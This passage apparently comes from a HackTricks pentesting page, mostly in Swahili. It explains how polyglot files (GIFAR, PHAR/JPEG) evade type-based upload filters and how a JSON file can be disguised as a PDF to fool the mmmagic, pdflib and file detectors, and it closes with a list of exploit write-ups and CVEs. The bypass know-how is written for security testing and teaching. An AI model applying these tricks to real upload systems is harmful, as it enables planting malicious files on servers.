Polyglot files hutumika kama zana maalum katika cybersecurity, zikifanya kazi kama chameleons zinazoweza kuwepo kwa uhalali katika formats nyingi za faili kwa wakati mmoja. Mfano wa kuvutia ni [GIFAR](https://en.wikipedia.org/wiki/Gifar), hybrid inayofanya kazi kama GIF na kifurushi cha RAR. Faili hizo hazizuiliki kwa mchanganyiko huo pekee; mchanganyiko kama GIF na JS au PPT na JS pia yanawezekana.

Manufaa ya msingi ya polyglot files ni uwezo wake wa kupitisha hatua za usalama zinazochuja faili kulingana na aina. Mazoezi ya kawaida katika applications mbalimbali ni kuruhusu aina fulani za faili kupakiwa—kama JPEG, GIF, au DOC—ili kupunguza hatari inayotokana na formats hatari (mfano, JS, PHP, au Phar files). Hata hivyo, polyglot, kwa kufuata vigezo vya muundo vya aina nyingi za faili, inaweza kwa uangalifu kupita vizingiti hivyo.

Licha ya ufanisi wake, polyglots hukutana na vizingiti. Kwa mfano, wakati polyglot inaweza kuwa PHAR file (PHp ARchive) na JPEG kwa wakati mmoja, mafanikio ya kupakia inaweza kutegemea sera za mfumo kuhusu file extension. Ikiwa mfumo ni mkali kuhusu extensions zinazoruhusiwa, muundo wa dual wa polyglot peke yake huenda usitosheleze kuhakikisha kupakiwa.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Jinsi ya kuepuka utambuzi wa aina ya faili kwa kupakia faili halali ya JSON hata kama haikuruhusiwa kwa kuiga faili ya PDF (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: As long as the `%PDF` magic bytes are in the first 1024 bytes it’s valid (get example from post)
- **`pdflib` library**: Add a fake PDF format inside a filed of the JSON so the library thinks it’s a pdf (get example from post)
- **`file` binary**: It can read up to 1048576 bytes from a file. Just create a JSON bigger than that so it cannot parse the content as a json and then inside the JSON put the initial part of a real PDF and it’ll think it’s a PDF

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
